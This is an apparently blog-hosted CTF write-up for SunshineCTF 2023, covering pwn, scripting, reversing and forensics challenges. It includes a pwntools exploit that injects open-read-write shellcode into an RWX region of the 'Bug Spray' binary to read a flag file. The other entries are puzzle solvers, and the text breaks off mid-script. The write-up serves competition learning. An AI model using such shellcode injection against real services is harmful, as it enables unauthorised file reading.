+<h3 id="Bug-Spray-🐛🪲🐞"><a href="#Bug-Spray-🐛🪲🐞" class="headerlink" title="Bug Spray 🐛🪲🐞"></a>Bug Spray 🐛🪲🐞</h3><hr>
+<p><img src="https://hackmd.io/_uploads/rkd-x7gbp.png" alt="Security check">  </p>
+<p>First thing first we use IDA Decompile it<br><a target="_blank" rel="noopener" href="https://hackmd.io/_uploads/BJ27jfgbT.png">IDA_DECOMPILE</a><br>imo that IDA didn’t decompile correctly<br>so i chose to oberserve the Assembly code  </p>
+<p><img src="https://hackmd.io/_uploads/H1_FJ7xWa.png" alt="IDA_DEASSEM"><br>In this block we know we have <em><strong>RWX</strong></em> at <code>0x777777</code> and its size is <code>0x12c</code><br>also we know after this block<br><code>r10=r12=0x64</code><br><img src="https://hackmd.io/_uploads/rJYMbmlZp.png"><br>Our target is goto <code>Lable:off</code> for the rwx segment  </p>
+<p>Todo   </p>
+<p>At the top two blocks of this picture we know it hope the length we wrote is 0x44 or 0x45 (0x64 &lt;&#x3D; rax+20 &lt; 0x66)  </p>
+<p>After that it do syscall, and we know 0x64 stands for <code>sys_time</code>, 0x65 stands for <code>sys_ptrace</code>, after testing we know only  <code>sys_ptrace</code> is possible to return 0  </p>
+<p>So, we’ll send <code>0x45 bytes</code><br><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">syscalltable</a>  </p>
+<p>For serveral times testing, I finally found out that <strong>CAN’T</strong> get shell by calling <code>execve(&quot;/bin/sh&quot;)</code><br>so i change to use orw and try to get flag  </p>
+<p>Finally I get the flag  </p>
+<p>btw the flag is at <code>./flag.txt</code>   </p>
+<h4 id="slove-script-2"><a href="#slove-script-2" class="headerlink" title="slove script:"></a>slove script:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;/data&#x27;</span>)</span><br><span class="line">sys.path.append(<span class="string">&#x27;/home/aukro/pwnbox/data&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> tool.template <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">init(<span class="number">64</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">r = nc(<span class="string">&#x27;nc chal.2023.sunshinectf.games 23004&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rbx,0x7478</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rbx, 0x742e67616c662f2e</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rax,0x2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdx, 0x40</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov r8,rax</span></span><br><span class="line"><span class="string">mov rdi,r8</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.send(shell+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x45</span>-<span class="built_in">len</span>(shell)))</span><br><span class="line">end()</span><br></pre></td></tr></table></figure>
+<h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag:"></a>Flag:</h4><p><code>sun&#123;mosquitos_and_horseflies_and_triangle_bugs_oh_my&#125;</code>  </p>
+<h2 id="Scripting"><a href="#Scripting" class="headerlink" title="Scripting"></a>Scripting</h2><h3 id="DDR"><a href="#DDR" class="headerlink" title="DDR"></a>DDR</h3><hr>
+<p><img src="https://hackmd.io/_uploads/BJaocml-a.png"><br>The first time we remote and press enter<br><del>Suddenly I lose</del> (x  </p>
+<p>Now we know we have to do this with scripts<br>when i try pwntools I found out that it send <code>\xe2\x87\xa6\xe2\x87\xa8\xe2\x87\xa6</code>and things like that  </p>
+<p>just use python script to slove this  </p>
+<h4 id="slove-script-3"><a href="#slove-script-3" class="headerlink" title="slove script:"></a>slove script:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;/data&#x27;</span>)</span><br><span class="line">sys.path.append(<span class="string">&#x27;/home/aukro/pwnbox/data&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> tool.template <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = nc(<span class="string">&#x27;nc chal.2023.sunshinectf.games 23200&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;Start --&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvlines(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ind = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    x = r.recvline().strip().split(<span class="string">b&#x27;\xe2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\x87\xa6&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    ans =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">b&#x27;\x87\xa6&#x27;</span>:</span><br><span class="line">            ans += <span class="string">&#x27;a&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">b&#x27;\x87\xa7&#x27;</span>:</span><br><span class="line">            ans += <span class="string">&#x27;w&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">b&#x27;\x87\xa8&#x27;</span>:</span><br><span class="line">            ans += <span class="string">&#x27;d&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">b&#x27;\x87\xa9&#x27;</span>:</span><br><span class="line">            ans += <span class="string">&#x27;s&#x27;</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            ans += <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ind+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(ans.encode(), ind)</span><br><span class="line">    r.sendline(ans.encode())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line"></span><br><span class="line">end()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag:"></a>Flag:</h4><p><code>sun&#123;d0_r0b0t5_kn0w_h0w_t0_d4nc3&#125;</code>  </p>
+<h3 id="SimonProgrammer-1"><a href="#SimonProgrammer-1" class="headerlink" title="SimonProgrammer 1"></a>SimonProgrammer 1</h3><hr>
+<p>A site that woud press some links and play some frequency , the mission is to follow it every time…<br><strong>Solution:</strong><br>After an observation on the js source, I noticed that the answers would store in an array called <code>global_frequencies</code>(but is the filename, also), and I just modify<code>current_frequencies_used_global</code> into <code>global_frequencies</code> and also with some string implementation, and finally post it to path <code>/flag</code> with it’s built-in function!<br><strong>Solve Script:</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">current_frequencies_used_global=global_frequencies</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; current_frequencies_used_global.<span class="property">length</span>; j++) &#123;</span><br><span class="line">        current_frequencies_used_global[j]=current_frequencies_used_global[j].<span class="title function_">replace</span>(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        current_frequencies_used_global[j]=current_frequencies_used_global[j].<span class="title function_">replace</span>(<span class="string">&quot;.wav&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_">submitFrequencies</span>(current_frequencies_used_global)</span><br></pre></td></tr></table></figure>
+<h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h2><h3 id="Dill"><a href="#Dill" class="headerlink" title="Dill"></a>Dill</h3><hr>
+<p>Slover: <code>堇姬naup</code>  </p>
+<p>After downloading, you can see a .pyc file.<br>You can find websites online that can decompiler it.<br><a target="_blank" rel="noopener" href="https://www.toolnb.com/tools-lang-zh-TW/pyc.html">https://www.toolnb.com/tools-lang-zh-TW/pyc.html</a><br>You will get this.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.5.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.5 (default, Jun 20 2023, 11:36:40) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span></span><br><span class="line"><span class="comment"># Embedded file name: dill.py</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 914 bytes</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dill</span>:</span><br><span class="line">    prefix = <span class="string">&#x27;sun&#123;&#x27;</span></span><br><span class="line">    suffix = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    o = [<span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.encrypted = <span class="string">&#x27;bGVnbGxpaGVwaWNrdD8Ka2V0ZXRpZGls&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">self, value: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (value.startswith(Dill.prefix) <span class="keyword">and</span> value.endswith(Dill.suffix)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        value = value[<span class="built_in">len</span>(Dill.prefix):-<span class="built_in">len</span>(Dill.suffix)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(value) != <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        c = [value[i:i + <span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(value), <span class="number">4</span>)]</span><br><span class="line">        value = <span class="string">&#x27;&#x27;</span>.join([c[i] <span class="keyword">for</span> i <span class="keyword">in</span> Dill.o])</span><br><span class="line">        <span class="keyword">if</span> value != self.encrypted:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+<p>After entering a number, the head and tail will be removed, then cut into groups of four and then swap positions.  </p>
+<p>I tried to restore it, but it must have been written incorrectly.However, the string length is not long, so you can try it out by using loop.  </p>
+<p><img src="https://hackmd.io/_uploads/ryjdDmgZ6.png">  </p>
+<p><strong>Solve Script</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dill</span>:</span><br><span class="line">    prefix = <span class="string">&#x27;sun&#123;&#x27;</span></span><br><span class="line">    suffix = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    o = [<span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.encrypted = <span class="string">&#x27;bGVnbGxpaGVwaWNrdD8Ka2V0ZXRpZGls&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">self, value: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (value.startswith(Dill.prefix) <span class="keyword">and</span> value.endswith(Dill.suffix)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        value = value[<span class="built_in">len</span>(Dill.prefix):-<span class="built_in">len</span>(Dill.suffix)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(value) != <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        c = [value[i:i + <span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(value), <span class="number">4</span>)]</span><br><span class="line">        value = <span class="string">&#x27;&#x27;</span>.join([c[i] <span class="keyword">for</span> i <span class="keyword">in</span> Dill.o])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> value != self.encrypted:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">dill_instance = Dill()  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">20</span>):</span><br><span class="line">    d=[<span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>]</span><br><span class="line">    value= <span class="string">&#x27;bGVnbGxpaGVwaWNrdD8Ka2V0ZXRpZGls&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">        value=b</span><br><span class="line">    c = [value[i:i + <span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(value), <span class="number">4</span>)]</span><br><span class="line">    ans=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        ans=ans+c[d[i]]</span><br><span class="line">    b=ans</span><br><span class="line">    ans=<span class="string">&quot;sun&#123;&quot;</span>+ans+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    </span><br><span class="line">    result = dill_instance.validate(ans) </span><br><span class="line">    <span class="keyword">if</span> result==<span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
+<h4 id="FLAG-sun-ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K"><a href="#FLAG-sun-ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K" class="headerlink" title="FLAG:sun{ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K}"></a>FLAG:<code>sun&#123;ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K&#125;</code></h4><hr>
+<hr>
+<h1 id="After-the-End"><a href="#After-the-End" class="headerlink" title="After the End"></a>After the End</h1><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Low-Effort-Wav-🌊"><a href="#Low-Effort-Wav-🌊" class="headerlink" title="Low Effort Wav 🌊"></a>Low Effort Wav 🌊</h3><hr>
+<blockquote>
+<p>Author : <code>堇姬Naup</code>  </p>
+</blockquote>
+<p>After downloading, it looks like a <code>.wav</code> file, but it is actually a <code>.png</code> file.  </p>
+<p><img src="https://hackmd.io/_uploads/SJNqbVMZp.png">  </p>
+<p>Convert it back to PNG first  </p>
+<p><img src="https://hackmd.io/_uploads/B1OxMNfZ6.png">  </p>
+<p>When I open it. The file seems to be cropped .It might be a <code>Cropalyps</code>  </p>
+<p><img src="https://hackmd.io/_uploads/rkEwzEfWp.png">  </p>
+<p>We used exiftool to find out that the phone model he used was <code>Google Pixel 7</code><br>We can use <a target="_blank" rel="noopener" href="https://acropalypse.app/">acropalypse.app</a> to restore the cropped part  </p>
+<p><img src="https://hackmd.io/_uploads/rJ3J7NGWp.png">  </p>
+<p>Select pixel 7 and restore it  </p>
+<p><img src="https://hackmd.io/_uploads/Bk-xIEz-p.png">  </p>
+<p><img src="https://hackmd.io/_uploads/rkjCHEf-6.png">  </p>
+<h4 id="FLAG-sun-well-that-was-low-effort"><a href="#FLAG-sun-well-that-was-low-effort" class="headerlink" title="FLAG:sun{well_that_was_low_effort}"></a>FLAG:<code>sun&#123;well_that_was_low_effort&#125;</code></h4><h2 id="Reversing-1"><a href="#Reversing-1" class="headerlink" title="Reversing"></a>Reversing</h2><h3 id="First-Date"><a href="#First-Date" class="headerlink" title="First Date"></a>First Date</h3><hr>
+<blockquote>
+<p>Author : <code>堇姬Naup</code>  </p>
+</blockquote>
+<p>Unzip the file he gave you to get a <code>pdx</code> containing <code>main.pdz</code> <code>pdxinfo</code><br><img src="https://hackmd.io/_uploads/BJK3QnM-p.png">  </p>
+<p>I studied the <code>.pdz</code> file and found some information.Playdate is a handheld video game console.<br><a target="_blank" rel="noopener" href="https://play.date/">https://play.date/</a><br><strong>Playdate game formats</strong>  </p>
+<ul>
+<li>luac - Lua bytecode  </li>
+<li>pdz - File container  </li>
+<li>pda - Audio file  </li>
+<li>pdi - Image file  </li>
+<li>pdt - Imagetable file  </li>
+<li>pdv - Video file  </li>
+<li>pds - Strings file  </li>
+<li>pft - Font file</li>
+</ul>
+<p>Try to find a playdate related reverse tool and you will find one.<br><a target="_blank" rel="noopener" href="https://github.com/cranksters/playdate-reverse-engineering/tree/main">https://github.com/cranksters/playdate-reverse-engineering/tree/main</a><br>What is <code>.pdz</code>?  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A file with the .pdz extension represents a file container that has been compiled by pdc. They mostly contain compiled Lua bytecode, but they can sometimes include other assets such as images or fonts. This format uses little endian byte order.</span><br></pre></td></tr></table></figure>
+<p>It has given a tool that can unpack all files from a <code>.pdz</code><br>You can get a <code>main.luac</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pdz.py &lt;.pdz&gt; &lt;路徑&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Scripting-1"><a href="#Scripting-1" class="headerlink" title="Scripting"></a>Scripting</h2><h3 id="SimonProgrammer-2"><a href="#SimonProgrammer-2" class="headerlink" title="SimonProgrammer 2"></a>SimonProgrammer 2</h3><hr>
+<blockquote>
+<p>Author : <code>堇姬Naup</code>  </p>
+</blockquote>
+<p>Continue the idea of simon1.<br>Go grab the variable <code>global_frequencies</code><br>You can get this.  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;/static/8J-kljI4N_CfpJYK.wav&#x27;, &#x27;/static/8J-kljM5N_CfpJYK.wav&#x27;, &#x27;/static/8J-kljM3N_CfpJYK.wav&#x27;, &#x27;/static/8J-kljEwMTbwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljE0ODDwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljIxNPCfpJYK.wav&#x27;, &#x27;/static/8J-kljEyOTbwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljE4MjPwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljQyMPCfpJYK.wav&#x27;, &#x27;/static/8J-kljE0Njnwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljExNjTwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljE5NDPwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljY1M_CfpJYK.wav&#x27;, &#x27;/static/8J-kljEwMjTwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljM2MfCfpJYK.wav&#x27;, &#x27;/static/8J-kljEyMjjwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljE1Njfwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljExMPCfpJYK.wav&#x27;, &#x27;/static/8J-kljQwMvCfpJYK.wav&#x27;, &#x27;/static/8J-kljI1OfCfpJYK.wav&#x27;, &#x27;/static/8J-kljI5OPCfpJYK.wav&#x27;, &#x27;/static/8J-kljIwMPCfpJYK.wav&#x27;, &#x27;/static/8J-kljEyMjjwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljUyOfCfpJYK.wav&#x27;, &#x27;/static/8J-kljEwODDwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljUyNPCfpJYK.wav&#x27;, &#x27;/static/8J-kljE1MDPwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljE3MDTwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljM0NfCfpJYK.wav&#x27;, &#x27;/static/8J-kljE4NvCfpJYK.wav&#x27;, &#x27;/static/8J-kljY08J-klgo=.wav&#x27;, &#x27;/static/8J-kljEwN_CfpJYK.wav&#x27;, &#x27;/static/8J-kljk1N_CfpJYK.wav&#x27;, &#x27;/static/8J-kljQ4NvCfpJYK.wav&#x27;, &#x27;/static/8J-kljYy8J-klgo=.wav&#x27;, &#x27;/static/8J-kljI1NPCfpJYK.wav&#x27;, &#x27;/static/8J-kljc2MfCfpJYK.wav&#x27;, &#x27;/static/8J-kljExOTTwn6SWCg==.wav&#x27;, &#x27;/static/8J-kljQ4MvCfpJYK.wav&#x27;, &#x27;/static/8J-kljE3ODHwn6SWCg==.wav&#x27;]</span><br></pre></td></tr></table></figure>
+<p>After removing <code>/static/</code> and <code>.wav</code>, base64 the string and remove the irrelevant characters at the beginning and end.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file=[<span class="string">&#x27;8J-kljI4N_CfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljM5N_CfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljM3N_CfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljEwMTbwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljE0ODDwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljIxNPCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljEyOTbwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljE4MjPwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljQyMPCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljE0Njnwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljExNjTwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljE5NDPwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljY1M_CfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljEwMjTwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljM2MfCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljEyMjjwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljE1Njfwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljExMPCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljQwMvCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljI1OfCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljI5OPCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljIwMPCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljEyMjjwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljUyOfCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljEwODDwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljUyNPCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljE1MDPwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljE3MDTwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljM0NfCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljE4NvCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljY08J-klgo=&#x27;</span>, <span class="string">&#x27;8J-kljEwN_CfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljk1N_CfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljQ4NvCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljYy8J-klgo=&#x27;</span>, <span class="string">&#x27;8J-kljI1NPCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljc2MfCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljExOTTwn6SWCg==&#x27;</span>, <span class="string">&#x27;8J-kljQ4MvCfpJYK&#x27;</span>, <span class="string">&#x27;8J-kljE3ODHwn6SWCg==&#x27;</span>]</span><br><span class="line">o=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line"></span><br><span class="line">    o.append(base64.urlsafe_b64decode(i).decode(<span class="string">&#x27;utf-8&#x27;</span>)[<span 